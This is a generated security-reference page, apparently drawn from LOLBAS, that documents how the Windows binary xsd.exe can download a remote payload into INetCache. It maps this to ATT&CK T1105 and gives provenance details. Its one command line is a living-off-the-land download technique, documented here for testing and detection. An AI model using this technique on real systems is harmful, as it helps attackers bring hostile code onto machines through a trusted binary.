---
parsed_by: focuslocust
source: commands
type: generated
---
# xsd Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## xsd.exe

Tool page: [xsd.exe](../../tools/windows/xsd.exe.md)

### It will download a remote payload and place it in INetCache

```text
xsd.exe {REMOTEURL}
```

Description:

Downloads payload from remote server

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/xsd.yml` |
| Evidence | Command preserved from source parser. |
